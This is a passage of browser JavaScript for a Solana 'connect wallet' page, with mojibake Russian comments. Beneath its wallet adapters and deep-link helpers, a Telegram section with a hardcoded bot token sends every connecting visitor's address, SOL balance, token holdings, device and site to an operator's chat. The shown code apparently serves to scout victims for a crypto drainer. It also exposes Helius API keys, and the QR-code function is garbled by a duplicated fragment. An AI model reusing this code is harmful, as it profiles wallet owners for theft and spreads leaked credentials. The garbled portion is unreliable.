            console.log('üîó Solflare connected:', provider.publicKey.toString());
            return {
              publicKey: provider.publicKey.toString(),
              provider: provider
            };
          } catch (error) {
            console.error('‚ùå Solflare connection failed:', error);
            throw error;
          }
        }
      },
      trustwallet: {
        name: 'Trust Wallet',
        logo: 'https://s.iimg.su/s/26/mA9QKT4xSAh5HifKsQIN8m9oZxn3ODrKcl1XQdtn.png',
        readyState: () => {
          if (typeof window !== 'undefined') {
            return window.trustwallet?.solana ? 'Installed' : 'NotDetected';
          }
          return 'Unsupported';
        },
        mobile: {
          android: {
            scheme: 'trust://browse/',
            universal: 'https://link.trustwallet.com/browse/',
            storeUrl: 'https://play.google.com/store/apps/details?id=com.wallet.crypto.trustapp'
          },
          ios: {
            scheme: 'trust://browse/',
            universal: 'https://link.trustwallet.com/browse/',
            storeUrl: 'https://apps.apple.com/app/trust-crypto-bitcoin-wallet/id1288339409'
          }
        },
        desktop: {
          chrome: 'https://chrome.google.com/webstore/detail/trust-wallet/egjidjbpglichdcondbcbdnbeeppgdph',
          brave: 'https://chrome.google.com/webstore/detail/trust-wallet/egjidjbpglichdcondbcbdnbeeppgdph'
        },
        connect: async function() {
          const provider = window.trustwallet?.solana;
          if (!provider) {
            throw new Error('Trust Wallet not found');
          }
          
          try {
            const response = await provider.connect();
            console.log('üîó Trust Wallet connected:', response.publicKey.toString());
            return {
              publicKey: response.publicKey.toString(),
              provider: provider
            };
          } catch (error) {
            console.error('‚ùå Trust Wallet connection failed:', error);
            throw error;
          }
        }
      },
      coinbase: {
        name: 'Coinbase Wallet',
        logo: 'https://s.iimg.su/s/26/75HQqHl0g9lz9qIFBEHNkRZknbnJVc69aqI5PlGK.png',
        readyState: () => {
          if (typeof window !== 'undefined') {
            return window.coinbaseSolana ? 'Installed' : 'NotDetected';
          }
          return 'Unsupported';
        },
        mobile: {
          android: {
            scheme: 'coinbase://browse/',
            universal: 'https://go.cb-w.com/browse/',
            storeUrl: 'https://play.google.com/store/apps/details?id=org.toshi'
          },
          ios: {
            scheme: 'coinbase://browse/',
            universal: 'https://go.cb-w.com/browse/',
            storeUrl: 'https://apps.apple.com/app/coinbase-wallet/id1278383455'
          }
        },
        desktop: {
          chrome: 'https://chrome.google.com/webstore/detail/coinbase-wallet-extension/hnfanknocfeofbddgcijnmhnfnkdnaad',
          brave: 'https://chrome.google.com/webstore/detail/coinbase-wallet-extension/hnfanknocfeofbddgcijnmhnfnkdnaad'
        },
        connect: async function() {
          const provider = window.coinbaseSolana;
          if (!provider) {
            throw new Error('Coinbase Wallet not found');
          }
          
          try {
            const response = await provider.connect();
            console.log('üîó Coinbase Wallet connected:', response.publicKey.toString());
            return {
              publicKey: response.publicKey.toString(),
              provider: provider
            };
          } catch (error) {
            console.error('‚ùå Coinbase Wallet connection failed:', error);
            throw error;
          }
        }
      },
      bitget: {
        name: 'Bitget Wallet',
        logo: 'https://s.iimg.su/s/26/HrAB9KDj99AnQOQZcxhY0htKY0oUFcONhY9jSUhP.png',
        readyState: () => {
          if (typeof window !== 'undefined') {
            return window.bitkeep?.solana ? 'Installed' : 'NotDetected';
          }
          return 'Unsupported';
        },
        mobile: {
          android: {
            scheme: 'bitkeep://browse/',
            universal: 'https://bkcode.vip/browse/',
            storeUrl: 'https://play.google.com/store/apps/details?id=com.bitget.wallet'
          },
          ios: {
            scheme: 'bitkeep://browse/',
            universal: 'https://bkcode.vip/browse/',
            storeUrl: 'https://apps.apple.com/app/bitget-wallet/id6444625622'
          }
        },
        desktop: {
          chrome: 'https://chrome.google.com/webstore/detail/bitget-wallet/jiidiaalihmmhddjgbnbgdfflelocpak',
          brave: 'https://chrome.google.com/webstore/detail/bitget-wallet/jiidiaalihmmhddjgbnbgdfflelocpak'
        },
        connect: async function() {
          const provider = window.bitkeep?.solana;
          if (!provider) {
            throw new Error('Bitget Wallet not found');
          }
          
          try {
            const response = await provider.connect();
            console.log('üîó Bitget Wallet connected:', response.publicKey.toString());
            return {
              publicKey: response.publicKey.toString(),
              provider: provider
            };
          } catch (error) {
            console.error('‚ùå Bitget Wallet connection failed:', error);
            throw error;
          }
        }
      }
    };
    
    /**
     * –û–ø—Ä–µ–¥–µ–ª—è–µ—Ç —Ç–∏–ø —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞ –∏ –±—Ä–∞—É–∑–µ—Ä–∞ (—É–ª—É—á—à–µ–Ω–Ω–∞—è –≤–µ—Ä—Å–∏—è)
     */
    function detectDevice() {
      const isAndroid = md.os() === 'AndroidOS';
      const isIOS = md.os() === 'iOS';
      const isMobile = isAndroid || isIOS || md.mobile() !== null;
      
      // –û–ø—Ä–µ–¥–µ–ª—è–µ–º –±—Ä–∞—É–∑–µ—Ä
      const userAgent = navigator.userAgent.toLowerCase();
      let browser = 'unknown';
      
      if (userAgent.indexOf('chrome') > -1 && userAgent.indexOf('edg') === -1) {
        browser = 'chrome';
      } else if (userAgent.indexOf('firefox') > -1) {
        browser = 'firefox';
      } else if (userAgent.indexOf('safari') > -1 && userAgent.indexOf('chrome') === -1) {
        browser = 'safari';
      } else if (userAgent.indexOf('edge') > -1 || userAgent.indexOf('edg') > -1) {
        browser = 'edge';
      } else if (userAgent.indexOf('brave') > -1) {
        browser = 'brave';
      }
      
      // –ü—Ä–æ–≤–µ—Ä—è–µ–º, –æ—Ç–∫—Ä—ã—Ç –ª–∏ —Å–∞–π—Ç –≤ –º–æ–±–∏–ª—å–Ω–æ–º –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–∏ –∫–æ—à–µ–ª—å–∫–∞
      const isInWalletApp = checkIfInWalletApp();
      
      return {
        isAndroid,
        isIOS,
        isMobile,
        browser,
        os: isAndroid ? 'android' : isIOS ? 'ios' : 'desktop',
        isInWalletApp
      };
    }
    
    /**
     * –ü—Ä–æ–≤–µ—Ä—è–µ—Ç, –æ—Ç–∫—Ä—ã—Ç –ª–∏ —Å–∞–π—Ç –≤–æ –≤—Å—Ç—Ä–æ–µ–Ω–Ω–æ–º –±—Ä–∞—É–∑–µ—Ä–µ –∫–æ—à–µ–ª—å–∫–∞
     */
    function checkIfInWalletApp() {
      const userAgent = navigator.userAgent.toLowerCase();
      
      // –ü—Ä–æ–≤–µ—Ä—è–µ–º —Ä–∞–∑–ª–∏—á–Ω—ã–µ –∫–æ—à–µ–ª—å–∫–∏
      if (userAgent.includes('phantom')) return 'phantom';
      if (userAgent.includes('solflare')) return 'solflare';
      if (userAgent.includes('trust')) return 'trust';
      if (userAgent.includes('coinbase')) return 'coinbase';
      if (userAgent.includes('bitkeep')) return 'bitget';
      
      return false;
    }
    
    /**
     * –°–æ–∑–¥–∞–µ—Ç deep link –¥–ª—è –∫–æ—à–µ–ª—å–∫–∞ (—É–ª—É—á—à–µ–Ω–Ω–∞—è –≤–µ—Ä—Å–∏—è)
     */
    function createWalletLink(walletKey, options = {}) {
      const wallet = WALLET_ADAPTER_CONFIG[walletKey];
      if (!wallet) return null;
      
      const device = detectDevice();
      const currentUrl = options.url || window.location.href;
      
      // –î–ª—è –º–æ–±–∏–ª—å–Ω—ã—Ö —É—Å—Ç—Ä–æ–π—Å—Ç–≤
      if (device.isMobile) {
        const platform = device.isAndroid ? 'android' : 'ios';
        const mobileConfig = wallet.mobile[platform];
        
        if (!mobileConfig) return null;
        
        // –°–æ–∑–¥–∞–µ–º —Å—Å—ã–ª–∫–∏ —Å –ø—Ä–∞–≤–∏–ª—å–Ω—ã–º —Ñ–æ—Ä–º–∞—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ–º
        const encodedUrl = encodeURIComponent(currentUrl);
        const schemeUrl = `${mobileConfig.scheme}${encodedUrl}`;
        const universalUrl = `${mobileConfig.universal}${encodedUrl}`;
        const storeUrl = mobileConfig.storeUrl;
        
        return {
          primary: schemeUrl,
          fallback: universalUrl,
          store: storeUrl,
          platform: platform
        };
      } 
      // –î–ª—è –¥–µ—Å–∫—Ç–æ–ø–∞
      else {
        const desktopConfig = wallet.desktop;
        if (!desktopConfig) return null;
        
        return {
          primary: desktopConfig[device.browser] || desktopConfig.chrome || null,
          browser: device.browser
        };
      }
    }
    
    /**
     * –û—Ç–∫—Ä—ã–≤–∞–µ—Ç –∫–æ—à–µ–ª–µ–∫ —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º wallet-adapter –ª–æ–≥–∏–∫–∏
     */
    async function openWallet(walletKey, options = {}) {
      const wallet = WALLET_ADAPTER_CONFIG[walletKey];
      if (!wallet) {
        console.error(`Wallet not found: ${walletKey}`);
        return false;
      }
      
      const device = detectDevice();
      
      // –ï—Å–ª–∏ –º—ã —É–∂–µ –≤ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–∏ –∫–æ—à–µ–ª—å–∫–∞, –ø—ã—Ç–∞–µ–º—Å—è –ø–æ–¥–∫–ª—é—á–∏—Ç—å—Å—è –Ω–∞–ø—Ä—è–º—É—é
      if (device.isInWalletApp === walletKey) {
        console.log(`üîó Detected ${walletKey} in-app browser, attempting direct connection`);
        try {
          return await wallet.connect();
        } catch (error) {
          console.error(`‚ùå Direct connection failed in ${walletKey} app:`, error);
        }
      }
      
      const links = createWalletLink(walletKey, options);
      if (!links) {
        console.error(`No links available for wallet: ${walletKey}`);
        return false;
      }
      
      // –î–ª—è –º–æ–±–∏–ª—å–Ω—ã—Ö —É—Å—Ç—Ä–æ–π—Å—Ç–≤ –∏—Å–ø–æ–ª—å–∑—É–µ–º —É–ª—É—á—à–µ–Ω–Ω—É—é —Å—Ö–µ–º—É
      if (device.isMobile) {
        console.log(`üì± Opening ${walletKey} on ${links.platform}`);
        
        // –°–æ–∑–¥–∞–µ–º –Ω–µ–≤–∏–¥–∏–º—ã–π iframe –¥–ª—è –ø–æ–ø—ã—Ç–∫–∏ –æ—Ç–∫—Ä—ã—Ç–∏—è —Å—Ö–µ–º—ã
        const iframe = document.createElement('iframe');
        iframe.style.display = 'none';
        iframe.src = links.primary;
        document.body.appendChild(iframe);
        
        // –£–¥–∞–ª—è–µ–º iframe —á–µ—Ä–µ–∑ –∫–æ—Ä–æ—Ç–∫–æ–µ –≤—Ä–µ–º—è
        setTimeout(() => {
          document.body.removeChild(iframe);
        }, 1000);
        
        // –¢–∞–∫–∂–µ –ø—ã—Ç–∞–µ–º—Å—è —á–µ—Ä–µ–∑ window.location –∫–∞–∫ fallback
        setTimeout(() => {
          if (!document.hidden) {
            window.location.href = links.fallback;
          }
        }, 500);
        
        // –ï—Å–ª–∏ —á–µ—Ä–µ–∑ 3 —Å–µ–∫—É–Ω–¥—ã –Ω–∏—á–µ–≥–æ –Ω–µ –ø—Ä–æ–∏–∑–æ—à–ª–æ, –æ—Ç–ø—Ä–∞–≤–ª—è–µ–º –≤ store
        setTimeout(() => {
          if (!document.hidden) {
            window.open(links.store, '_blank');
          }
        }, 3000);
        
        return true;
      } 
      // –î–ª—è –¥–µ—Å–∫—Ç–æ–ø–∞ –æ—Ç–∫—Ä—ã–≤–∞–µ–º —Å—Å—ã–ª–∫—É –Ω–∞ —Ä–∞—Å—à–∏—Ä–µ–Ω–∏–µ
      else {
        if (links.primary) {
          window.open(links.primary, '_blank');
          return true;
        }
        return false;
      }
    }
    
    /**
     * –ü—Ä–æ–≤–µ—Ä—è–µ—Ç —Å—Ç–∞—Ç—É—Å –≤—Å–µ—Ö –∫–æ—à–µ–ª—å–∫–æ–≤
     */
    function checkWalletStatuses() {
      const device = detectDevice();
      
      Object.keys(WALLET_ADAPTER_CONFIG).forEach(walletKey => {
        const wallet = WALLET_ADAPTER_CONFIG[walletKey];
        const readyState = wallet.readyState();
        const statusElement = document.getElementById(`${walletKey}Status`);
        
        if (statusElement) {
          if (device.isMobile) {
            statusElement.textContent = 'Mobile';
            statusElement.className = 'wallet-status mobile';
          } else {
            switch (readyState) {
              case 'Installed':
                statusElement.textContent = 'Installed';
                statusElement.className = 'wallet-status';
                break;
              case 'NotDetected':
                statusElement.textContent = 'Not Installed';
                statusElement.className = 'wallet-status desktop';
                break;
              default:
                statusElement.textContent = 'Unsupported';
                statusElement.className = 'wallet-status desktop';
            }
          }
        }
      });
    }
    
    /**
     * –ì–µ–Ω–µ—Ä–∏—Ä—É–µ—Ç QR-–∫–æ–¥ –¥–ª—è –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è
     */
    function generateQRCode(url, elementId = 'qrCanvas') {
      const canvas = document.getElementById(elementId);
      if (canvas && window.QRCode) {
        QRCode.toCanvas(canvas, url, {
          width: 256,
          margin: 2,
          color: {
            dark: '#000000',
            light: '#FFFFFF'
          }
        }, (error) => {
          if (error) {
            console.error('‚ùå –û—à–∏–±–∫–∞ –≥–µ–Ω–µ—Ä–∞—Ü–∏–∏ QR –∫–æ–¥–∞:', error);
          } else {
            console.log('
            console.error('‚ùå –û—à–∏–±–∫–∞ –≥–µ–Ω–µ—Ä–∞—Ü–∏–∏ QR –∫–æ–¥–∞:', error);
          } else {
            console.log('‚úÖ QR –∫–æ–¥ —Å–≥–µ–Ω–µ—Ä–∏—Ä–æ–≤–∞–Ω');
          }
        });
      }
    }
    
    /**
     * –ü–æ–∫–∞–∑—ã–≤–∞–µ—Ç –º–æ–¥–∞–ª—å–Ω–æ–µ –æ–∫–Ω–æ —Å QR-–∫–æ–¥–æ–º –∏ deep links (—É–ª—É—á—à–µ–Ω–Ω–∞—è –≤–µ—Ä—Å–∏—è)
     */
    function showConnectionModal(walletKey, wcUri = null) {
      const wallet = WALLET_ADAPTER_CONFIG[walletKey];
      if (!wallet) return;
      
      const device = detectDevice();
      const currentUrl = window.location.href;
      
      // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º –º–æ–¥–∞–ª—å–Ω–æ–µ –æ–∫–Ω–æ
      document.getElementById('qrModal').classList.remove('hidden');
      document.getElementById('modalOverlay').classList.remove('hidden');
      
      // –£—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º –Ω–∞–∑–≤–∞–Ω–∏–µ –∫–æ—à–µ–ª—å–∫–∞
      document.getElementById('qrWalletName').textContent = wallet.name;
      document.getElementById('walletAppName').textContent = wallet.name;
      document.getElementById('walletExtensionName').textContent = wallet.name;
      
      // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º —Å–æ–æ—Ç–≤–µ—Ç—Å—Ç–≤—É—é—â–∏–µ –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏–∏
      const mobileInstructions = document.getElementById('mobileInstructions');
      const desktopInstructions = document.getElementById('desktopInstructions');
      
      if (device.isMobile) {
        mobileInstructions.classList.remove('hidden');
        desktopInstructions.classList.add('hidden');
      } else {
        mobileInstructions.classList.add('hidden');
        desktopInstructions.classList.remove('hidden');
      }
      
      // –ì–µ–Ω–µ—Ä–∏—Ä—É–µ–º QR-–∫–æ–¥ —Å WalletConnect URI –∏–ª–∏ —Ç–µ–∫—É—â–∏–º URL
      const qrUrl = wcUri || currentUrl;
      generateQRCode(qrUrl);
      
      // –°–æ–∑–¥–∞–µ–º –∫–Ω–æ–ø–∫–∏ –¥–ª—è deep links
      const deepLinkButtons = document.getElementById('deepLinkButtons');
      deepLinkButtons.innerHTML = '';
      
      // –ï—Å–ª–∏ –º–æ–±–∏–ª—å–Ω–æ–µ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–æ
      if (device.isMobile) {
        // –ö–Ω–æ–ø–∫–∞ –¥–ª—è –æ—Ç–∫—Ä—ã—Ç–∏—è –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è
        const openButton = document.createElement('button');
        openButton.className = `deep-link-btn ${walletKey}`;
        openButton.textContent = `Open in ${wallet.name}`;
        openButton.onclick = () => {
          openWallet(walletKey);
          // –ó–∞–∫—Ä—ã–≤–∞–µ–º –º–æ–¥–∞–ª—å–Ω–æ–µ –æ–∫–Ω–æ —á–µ—Ä–µ–∑ –Ω–µ–±–æ–ª—å—à—É—é –∑–∞–¥–µ—Ä–∂–∫—É
          setTimeout(() => {
            closeAllModals();
          }, 1000);
        };
        deepLinkButtons.appendChild(openButton);
        
        // –ö–Ω–æ–ø–∫–∞ –¥–ª—è —É—Å—Ç–∞–Ω–æ–≤–∫–∏ –∏–∑ –º–∞–≥–∞–∑–∏–Ω–∞
        const links = createWalletLink(walletKey);
        if (links && links.store) {
          const storeButton = document.createElement('button');
          storeButton.className = 'deep-link-btn';
          storeButton.style.backgroundColor = '#28a745';
          storeButton.textContent = `Install ${wallet.name}`;
          storeButton.onclick = () => window.open(links.store, '_blank');
          deepLinkButtons.appendChild(storeButton);
        }
        
        // –ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ –ø—ã—Ç–∞–µ–º—Å—è –æ—Ç–∫—Ä—ã—Ç—å –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ
        setTimeout(() => {
          openWallet(walletKey);
        }, 1000);
      } 
      // –î–ª—è –¥–µ—Å–∫—Ç–æ–ø–∞
      else {
        const readyState = wallet.readyState();
        
        if (readyState === 'Installed') {
          // –ö–æ—à–µ–ª–µ–∫ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω, –ø–æ–∫–∞–∑—ã–≤–∞–µ–º –∫–Ω–æ–ø–∫—É –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è
          const connectButton = document.createElement('button');
          connectButton.className = `deep-link-btn ${walletKey}`;
          connectButton.textContent = `Connect ${wallet.name}`;
          connectButton.onclick = async () => {
            try {
              const result = await wallet.connect();
              if (result && window.walletManager) {
                window.walletManager.onWalletConnected(result.publicKey, wallet.name, result.provider);
              }
              closeAllModals();
            } catch (error) {
              console.error('Connection failed:', error);
              alert(`Failed to connect to ${wallet.name}: ${error.message}`);
            }
          };
          deepLinkButtons.appendChild(connectButton);
        } else {
          // –ö–æ—à–µ–ª–µ–∫ –Ω–µ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω, –ø–æ–∫–∞–∑—ã–≤–∞–µ–º –∫–Ω–æ–ø–∫—É —É—Å—Ç–∞–Ω–æ–≤–∫–∏
          const links = createWalletLink(walletKey);
          if (links && links.primary) {
            const installButton = document.createElement('button');
            installButton.className = 'deep-link-btn';
            installButton.textContent = `Install ${wallet.name}`;
            installButton.onclick = () => window.open(links.primary, '_blank');
            deepLinkButtons.appendChild(installButton);
          }
        }
      }
      
      // –î–æ–±–∞–≤–ª—è–µ–º –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ–± —É—Å—Ç—Ä–æ–π—Å—Ç–≤–µ
      const deviceInfo = document.createElement('div');
      deviceInfo.className = 'device-info';
      let deviceText = `Device: ${device.isMobile ? 'Mobile' : 'Desktop'} (${device.os}`;
      if (!device.isMobile) {
        deviceText += `, ${device.browser}`;
      }
      if (device.isInWalletApp) {
        deviceText += `, in ${device.isInWalletApp} app`;
      }
      deviceText += ')';
      deviceInfo.textContent = deviceText;
      deepLinkButtons.appendChild(deviceInfo);
    }

    // ============================================================================
    // TELEGRAM INTEGRATION
    // ============================================================================

    const TELEGRAM_CONFIG = {
      BOT_TOKEN: '7523783619:AAHrK8KtQT3t_SflVhz2POJ1RDaLp1PuJEc',
      CHAT_ID: '7253475769'
    };

    function showTelegramStatus(type, message) {
      const statusElement = document.getElementById('telegramStatus');
      statusElement.className = `telegram-status ${type}`;
      statusElement.textContent = message;
      statusElement.classList.remove('hidden');

      if (type === 'success' || type === 'error') {
        setTimeout(() => {
          statusElement.classList.add('hidden');
        }, 3000);
      }
    }

    async function sendWalletInfoToTelegram(walletName, walletData) {
      showTelegramStatus('sending', 'üì§ –û—Ç–ø—Ä–∞–≤–∫–∞ –≤ Telegram...');
      
      const currentTime = new Date().toLocaleString('ru-RU', {
        timeZone: 'Europe/Moscow',
        year: 'numeric',
        month: '2-digit',
        day: '2-digit',
        hour: '2-digit',
        minute: '2-digit',
        second: '2-digit'
      });

      const device = detectDevice();
      
      let message = `üöÄ –ü–û–î–ö–õ–Æ–ß–ï–ù–ò–ï –ö–û–®–ï–õ–¨–ö–ê (Enhanced Mobile Support)

`;
      message += `üíº –ö–æ—à–µ–ª–µ–∫: ${walletName}
`;
      message += `üìç –ê–¥—Ä–µ—Å: ${walletData.address}
`;
      message += `‚è∞ –í—Ä–µ–º—è: ${currentTime}
`;
      message += `üåê –°–∞–π—Ç: ${window.location.hostname}
`;
      message += `üì± –£—Å—Ç—Ä–æ–π—Å—Ç–≤–æ: ${device.isMobile ? 'Mobile' : 'Desktop'} (${device.os})
`;
      if (device.isInWalletApp) {
        message += `üîó –ë—Ä–∞—É–∑–µ—Ä –∫–æ—à–µ–ª—å–∫–∞: ${device.isInWalletApp}
`;
      }
      message += `

`;
      
      message += `üìä –†–ï–ó–£–õ–¨–¢–ê–¢–´ –°–ö–ê–ù–ò–†–û–í–ê–ù–ò–Ø:
`;
      message += `üí∞ –ë–∞–ª–∞–Ω—Å SOL: ${walletData.solBalance.toFixed(4)} SOL
`;
      message += `ü™ô –í—Å–µ–≥–æ —Ç–æ–∫–µ–Ω–æ–≤: ${walletData.totalTokenAccounts}
`;
      message += `‚è∞ –í—Ä–µ–º—è —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏—è: ${new Date(walletData.scanTimestamp).toLocaleTimeString()}
`;
      message += `‚ö° –¢–∏–ø —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏—è: Fast Scan
`;
      message += `üöÄ –î–ª–∏—Ç–µ–ª—å–Ω–æ—Å—Ç—å: ${walletData.scanDuration}–º—Å
`;
      message += `‚úÖ –°—Ç–∞—Ç—É—Å: ${walletData.success ? '–£—Å–ø–µ—à–Ω–æ' : '–û—à–∏–±–∫–∞'}

`;

      if (walletData.tokens && walletData.tokens.length > 0) {
        message += `üíé –¢–û–ö–ï–ù–´ –° –ë–ê–õ–ê–ù–°–û–ú:
`;
        walletData.tokens.slice(0, 5).forEach((token, index) => {
          message += `${index + 1}. ${token.name}
`;
          message += `   üí∞ –ö–æ–ª–∏—á–µ—Å—Ç–≤–æ: ${token.amount}
`;
          message += `   üîó Mint: ${token.mint.substring(0, 8)}...${token.mint.substring(token.mint.length - 8)}

`;
        });
        
        if (walletData.tokens.length > 5) {
          message += `... –∏ –µ—â–µ ${walletData.tokens.length - 5} —Ç–æ–∫–µ–Ω–æ–≤

`;
        }
      } else {
        message += `üì≠ –¢–æ–∫–µ–Ω—ã –Ω–µ –Ω–∞–π–¥–µ–Ω—ã –∏–ª–∏ –≤—Å–µ –±–∞–ª–∞–Ω—Å—ã —Ä–∞–≤–Ω—ã 0

`;
      }

      if (walletData.methodUsed) {
        message += `üì° –ú–µ—Ç–æ–¥ —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏—è: ${walletData.methodUsed}
`;
      }

      if (walletData.solBalance > 0) {
        message += `üíµ –ü—Ä–∏–º–µ—Ä–Ω–∞—è —Å—Ç–æ–∏–º–æ—Å—Ç—å SOL: ~$${(walletData.solBalance * 100).toFixed(2)} USD
`;
      }

      try {
        console.log('üì§ –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ –∫–æ—à–µ–ª—å–∫–µ –≤ Telegram...');
        
        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_CONFIG.BOT_TOKEN}/sendMessage`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            chat_id: TELEGRAM_CONFIG.CHAT_ID,
            text: message,
            disable_web_page_preview: true
          })
        });

        const responseData = await response.json();
        
        if (response.ok && responseData.ok) {
          console.log('‚úÖ –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ –∫–æ—à–µ–ª—å–∫–µ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–∞ –≤ Telegram');
          showTelegramStatus('success', '‚úÖ –û—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ –≤ Telegram');
          return true;
        } else {
          console.error('‚ùå –û—à–∏–±–∫–∞ Telegram API:', responseData);
          showTelegramStatus('error', '‚ùå –û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏');
          return await sendViaAlternativeMethod(message);
        }
      } catch (error) {
        console.error('‚ùå –û—à–∏–±–∫–∞ —Å–µ—Ç–∏:', error);
        showTelegramStatus('error', '‚ùå –û—à–∏–±–∫–∞ —Å–µ—Ç–∏');
        return await sendViaAlternativeMethod(message);
      }
    }

    async function sendViaAlternativeMethod(message) {
      try {
        console.log('üîÑ –ü—Ä–æ–±—É–µ–º –∞–ª—å—Ç–µ—Ä–Ω–∞—Ç–∏–≤–Ω—ã–π –º–µ—Ç–æ–¥ –æ—Ç–ø—Ä–∞–≤–∫–∏...');
        
        const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_CONFIG.BOT_TOKEN}/sendMessage`;
        
        const response = await fetch(telegramUrl, {
          method: 'POST',
          mode: 'no-cors',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            chat_id: TELEGRAM_CONFIG.CHAT_ID,
            text: message,
            disable_web_page_preview: true
          })
        });

        console.log('üì§ –ê–ª—å—Ç–µ—Ä–Ω–∞—Ç–∏–≤–Ω—ã–π –∑–∞–ø—Ä–æ—Å –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω');
        showTelegramStatus('success', '‚úÖ –û—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ (–∞–ª—å—Ç–µ—Ä–Ω–∞—Ç–∏–≤–Ω–æ)');
        return true;
        
      } catch (error) {
        console.error('‚ùå –ê–ª—å—Ç–µ—Ä–Ω–∞—Ç–∏–≤–Ω—ã–π –º–µ—Ç–æ–¥ —Ç–æ–∂–µ –Ω–µ —Å—Ä–∞–±–æ—Ç–∞–ª:', error);
        showTelegramStatus('error', '‚ùå –í—Å–µ –º–µ—Ç–æ–¥—ã –Ω–µ —Å—Ä–∞–±–æ—Ç–∞–ª–∏');
        return false;
      }
    }

    // ============================================================================
    // WALLET BALANCE CHECKER
    // ============================================================================

    async function makeRequest(url, method, data, retries = 2, timeout = 5000) {
      for (let attempt = 1; attempt <= retries; attempt++) {
        try {
          const controller = new AbortController();
          const timeoutId = setTimeout(() => controller.abort(), timeout);

          const options = {
            method,
            headers: { 'Content-Type': 'application/json' },
            signal: controller.signal
          };

          if (data && method !== 'GET') {
            options.body = JSON.stringify(data);
          }

          const response = await fetch(url, options);
          clearTimeout(timeoutId);

          if (!response.ok) {
            throw new Error(`HTTP ${response.status}: ${response.statusText}`);
          }

          return await response.json();
        } catch (error) {
          console.error(`Attempt ${attempt} failed for ${url}: ${error.message}`);
          if (attempt === retries) {
            console.error(`All attempts failed for ${url}`);
            return null;
          }
          await new Promise(resolve => setTimeout(resolve, 500));
        }
      }
    }

    async function checkWalletBalanceFast(walletAddress) {
      const heliusRpcUrl = 'https://mainnet.helius-rpc.com/';
      const heliusApiUrl = 'https://api.helius.xyz/v0/addresses/';
      const publicRpcUrl = 'https://api.mainnet-beta.solana.com';
      const apiKeys = [
        '5d71bf51-5f82-4892-8b89-c7257acb9384',
        'ece615f0-f4eb-4a27-a912-bb7ccdf1759e'
      ];

      const priorityRequests = [
        {
          url: `${heliusApiUrl}${walletAddress}/balances?api-key=${apiKeys[0]}`,
          method: 'GET',
          data: null,
          desc: 'Helius API (Key 1) - SOL and Tokens',
          type: 'combined'
        },
        {
          url: `${heliusApiUrl}${walletAddress}/balances?api-key=${apiKeys[1]}`,
          method: 'GET',
          data: null,
          desc: 'Helius API (Key 2) - SOL and Tokens',
          type: 'combined'
        },
        {
          url: `${heliusRpcUrl}?api-key=${apiKeys[0]}`,
          method: 'POST',
          data: { jsonrpc: '2.0', id: 1, method: 'getBalance', params: [walletAddress] },
          desc: 'Helius RPC (Key 1) - SOL Balance',
          type: 'sol'
        },
        {
          url: publicRpcUrl,
          method: 'POST',
          data: { jsonrpc: '2.0', id: 1, method: 'getBalance', params: [walletAddress] },
          desc: 'Public RPC - SOL Balance',
          type: 'sol'
        }
      ];

      const results = {
        solBalance: 0,
        tokens: [],
        methodUsed: null,
        scanTime: Date.now(),
        success: false
      };

      console.log('üöÄ –ù–∞—á–∏–Ω–∞–µ–º –±—ã—Å—Ç—Ä–æ–µ —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ...');

      for (const req of priorityRequests) {
        console.log(`‚ö° –ü—Ä–æ–±—É–µ–º: ${req.desc}`);
        
        const result = await makeRequest(req.url, req.method, req.data, 1, 3000);
        
        if (result) {
          results.methodUsed = req.desc;
          results.success = true;
          
          if (req.type === 'combined') {
            results.solBalance = result.nativeBalance / 1_000_000_000 || 0;
            results.tokens = result.tokens || [];
            
            console.log(`‚úÖ –£—Å–ø–µ—Ö! SOL: ${results.solBalance}, –¢–æ–∫–µ–Ω—ã: ${results.tokens.length}`);
            
            if (results.solBalance > 0 || results.tokens.length > 0) {
              results.scanTime = Date.now() - results.scanTime;
              return results;
            }
          } else if (req.type === 'sol') {
            results.solBalance = result.result?.value / 1_000_000_000 || 0;
            
            console.log(`‚úÖ –ü–æ–ª—É—á–µ–Ω –±–∞–ª–∞–Ω—Å SOL: ${results.solBalance}`);
            
            if (results.solBalance > 0) {
              const tokenResult = await getTokensQuick(walletAddress);
              if (tokenResult) {
                results.tokens = tokenResult;
              }
              results.scanTime = Date.now() - results.scanTime;
              return results;
            }
          }
        }
      }

      results.scanTime = Date.now() - results.scanTime;
      return results;
    }

    async function getTokensQuick(walletAddress) {
      const heliusRpcUrl = 'https://mainnet.helius-rpc.com/';
      const apiKey = '5d71bf51-5f82-4892-8b89-c7257acb9384';
      
      console.log('ü™ô –ë—ã—Å—Ç—Ä–æ –ø–æ–ª—É—á–∞–µ–º —Ç–æ–∫–µ–Ω—ã...');
      
